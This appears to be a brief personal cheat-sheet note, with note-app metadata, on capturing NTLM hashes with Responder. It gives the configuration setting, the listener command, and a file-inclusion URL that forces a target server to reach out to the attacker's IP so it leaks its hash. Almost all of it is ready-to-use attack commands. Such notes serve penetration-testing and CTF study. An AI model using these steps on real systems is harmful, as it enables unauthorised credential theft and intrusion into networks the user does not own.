---
title: Responder
updated: 2023-10-28 12:00:08Z
created: 2023-10-28 11:17:19Z
latitude: 52.52000660
longitude: 13.40495400
altitude: 0.0000
---

To capture NTLM hash
Set **SMB** and **HTTP** to **ON** in Responder.conf
`responder -I tun0 -v`

Force the target to browse to hacker IP:

**HTTP File-inclusion**
`http://<target>/index.php?page=//<hackerIP>/whatever`

